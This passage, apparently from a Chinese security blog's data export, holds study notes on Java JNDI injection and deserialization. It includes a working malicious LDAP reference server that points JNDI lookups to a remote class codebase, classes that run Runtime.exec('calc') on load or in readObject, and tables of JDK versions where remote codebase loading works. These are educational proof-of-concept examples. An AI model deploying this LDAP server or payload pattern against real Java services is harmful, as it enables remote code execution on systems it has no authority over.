<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译的时候没问题，在运行的时候会抛出java.lang.NoClassDefFoundError的异常</p><p>因为会按照package指定的路径去找肯定找不到。。</p><p>java.lang.NoClassDefFoundError 是在类路径中找不到所需类时抛出的运行时错误，因此 JVM 无法将其加载到内存中。</p><h2 id="JNDI注入之LDAP"><a href="#JNDI注入之LDAP" class="headerlink" title="JNDI注入之LDAP"></a>JNDI注入之LDAP</h2><p>server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> sun.nio.cs.CharsetMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明DN</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;a=1cfh,b=hacker&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="comment">// InMemoryDirectoryServerConfig 配置, 因为此处ldap毕竟是基于内存</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听器配置</span></span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加操作函数</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 开始监听</span></span><br><span class="line">            ds.startListening();       </span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();        <span class="comment">// 打印异常堆栈</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收ldap请求的业务逻辑</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span>&#123;</span><br><span class="line">            <span class="comment">// 获取DN</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 声明entry 将数据封装在其中</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">// URL对象</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span>+ turl);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 设置javaClassName属性</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> )&#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// payload1 : 利用LDAP + Reference Factory</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// payload2 : 返回序列化 Gadget</span></span><br><span class="line">            <span class="comment">// try &#123;</span></span><br><span class="line">            <span class="comment">//     e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;...&quot;));</span></span><br><span class="line">            <span class="comment">// &#125;catch (Exception exception)&#123;</span></span><br><span class="line">            <span class="comment">//    exception.printStackTrace();</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送entry</span></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            <span class="comment">// 发送类似于状态码的对象</span></span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DNSlog作POC"><a href="#DNSlog作POC" class="headerlink" title="DNSlog作POC"></a>DNSlog作POC</h2><p>在JNDI中，本质上是要发起一次http请求</p><p>所以可以使用dnslog作为poc检测</p><h1 id="高版本JDK的JNDI注入打法"><a href="#高版本JDK的JNDI注入打法" class="headerlink" title="高版本JDK的JNDI注入打法"></a>高版本JDK的JNDI注入打法</h1><h2 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h2><p>JNDI注入对Java版本有限制</p><table><thead><tr><th><strong>协议</strong></th><th><strong>JDK6</strong></th><th><strong>JDK7</strong></th><th><strong>JDK8</strong></th><th><strong>JDK11</strong></th></tr></thead><tbody><tr><td>LADP</td><td>6u211以下</td><td>7u201以下</td><td>8u191以下</td><td>11.0.1以下</td></tr><tr><td>RMI</td><td>6u132以下</td><td>7u122以下</td><td>8u113以下</td><td>无</td></tr></tbody></table><ul><li><blockquote><p>jdk6u45，&gt;jdk7u21：RMI server的useCodebaseOnly默认为true，从而禁止利用RMI ClassLoader加载远程类（但是可以使用Reference绕过）</p></blockquote></li></ul><p>攻防历程：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111636.png" alt="image.png"></p><ul><li><strong>6u45 7u21 之后</strong>: <code>java.rmi.server.useCodebaseOnly</code> 默认为 true, 禁止利用 RMI ClassLoader 加载远程类 (但是 Reference 加载远程类本质上利用的是 URLClassLoader, 所以该参数对于 JNDI 注入无任何影响 )</li><li><strong>6u141, 7u131, 8u121 之后</strong>: <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 和 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 默认为 false, 禁止 RMI 和 CORBA 协议使用远程 codebase 来进行 JNDI 注入</li><li><strong>6u211, 7u201, 8u191 之后</strong>: <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为 false, 禁止 LDAP 协议使用远程 codebase 来进行 JNDI 注入</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p></li><li><p>xz的文章：<a href="https://exp10it.io/2022/12/jndi-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/#jndi-%E6%B3%A8%E5%85%A5">https://exp10it.io/2022/12/jndi-注入浅析/#jndi-注入</a></p></li><li><p>pdf：</p><p><a href="Java%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596-RMI-JNDI.pdf">Java反序列化-RMI-JNDI.pdf</a></p></li><li><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#%E6%BC%8F%E6%B4%9E%E7%82%B92%E2%80%94%E2%80%94classFactoryLocation%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5">https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/#漏洞点2——classFactoryLocation参数注入</a></p></li><li><p>jndi打高版本jdk：<a href="https://m0d9.me/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/">https://m0d9.me/2020/07/23/JNDI-LDAP 注入及高版本JDK限制——上/</a></p></li><li><p>打高版本jdk：<a href="https://paper.seebug.org/942/">https://paper.seebug.org/942/</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化基础</title>
      <link href="/2024/06/12/WebExploit/Java/java-unser-base/"/>
      <url>/2024/06/12/WebExploit/Java/java-unser-base/</url>
      
        <content type="html"><![CDATA[<h1 id="Java序列化和反序列化的基础知识"><a href="#Java序列化和反序列化的基础知识" class="headerlink" title="Java序列化和反序列化的基础知识"></a>Java序列化和反序列化的基础知识</h1><h2 id="原生方法-demo"><a href="#原生方法-demo" class="headerlink" title="原生方法 - demo"></a>原生方法 - demo</h2><p>一个实现了Serializable接口的类，可以进行序列化操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="comment">// 实现了 Serializable接口的类才能进行序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行序列化的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> utils.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 以文件流的形式封装, 再以Object流的形式封装</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="comment">// 将对象写入到流中</span></span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行反序列化的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>流对象：</li></ol><ul><li><p>ObjectOutputStream：代表对象输出流</p><ul><li>writeObject：往对象输出流中写入对象</li></ul></li><li><p>ObjectInputStream：代表对象输入流</p><ul><li>readObject：往对象输入流中读取对象</li></ul></li></ul><ol start="2"><li><p>实现Serializable接口的子类也可以被序列化</p></li><li><p>静态成员变量是不能被序列化的，序列化是针对对象属性的，而静态成员变量是属于类的</p></li><li><p>transient标识的对象成员变量不参与序列化</p></li></ol><h2 id="重写方法-demo"><a href="#重写方法-demo" class="headerlink" title="重写方法 - demo"></a>重写方法 - demo</h2><p>重写方法指的是重写<code>writeObject</code>和<code>readObject</code>方法</p><p>重写是为了对于某些特定需求进行定制化的序列化和反序列化</p><p>比如你可以只实现一些属性的序列化</p><blockquote><p>此处便有安全问题：当服务端进行反序列化数据时，客户端传递类的readObject方法中的代码会被执行</p></blockquote><p>场景：</p><ul><li>入口类的readObject直接调用危险方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 重写readObject时得先执行defaultReadObject</span></span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重写方法中的逻辑代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>入口类参数中包含可控类，该类有危险方法，readObject时调用</p><ul><li>入口类：<code>source</code>（重写<code>readObject</code>，调用常见函数，参数类型宽泛，最后jdk自带）</li><li>调用链：<code>gadget chain</code></li><li>执行类：<code>sink</code>（<code>rce</code>，<code>ssrf</code>，写文件等）</li></ul></li><li><p>入口类参数中包含可控类，该类又调用其他危险方法的类，readObject时调用</p></li></ul><h1 id="Java反射和URLDNS链"><a href="#Java反射和URLDNS链" class="headerlink" title="Java反射和URLDNS链"></a>Java反射和URLDNS链</h1><h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>反射让java具有动态性</p><p>此处主要从几个方面来学习Java反射</p><ul><li>从原型class里面实例化对象</li><li>获取类内的属性</li><li>获取、调用类里面的方法</li></ul><blockquote><p>在Java反序列化中的应用：</p><ul><li>使用反射修改属性，可以获取定制化的类对象</li><li>通过invoke调用除了同名函数以外的函数</li><li>通过Class类创建对象，引入不能序列化的类 <ul><li>一个很经典的例子就是Runtime.class</li></ul></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="comment">// System.out.println(person.getClass());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 从原型class里面实例化对象</span></span><br><span class="line">        c.newInstance();</span><br><span class="line">            <span class="comment">// 获取类内的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personConstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personConstructor.newInstance(<span class="string">&quot;abc&quot;</span>, <span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取类内的属性</span></span><br><span class="line">        Field[] personFields = c.getFields();           <span class="comment">// 获取 public</span></span><br><span class="line">        Field[] personDeclaredFields = c.getDeclaredFields();       <span class="comment">// 获取所有的</span></span><br><span class="line">        System.out.println(<span class="string">&quot;getFields function:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Field f:personFields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredFields function:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Field fd:personDeclaredFields)&#123;</span><br><span class="line">            System.out.println(fd);</span><br><span class="line">        &#125;</span><br><span 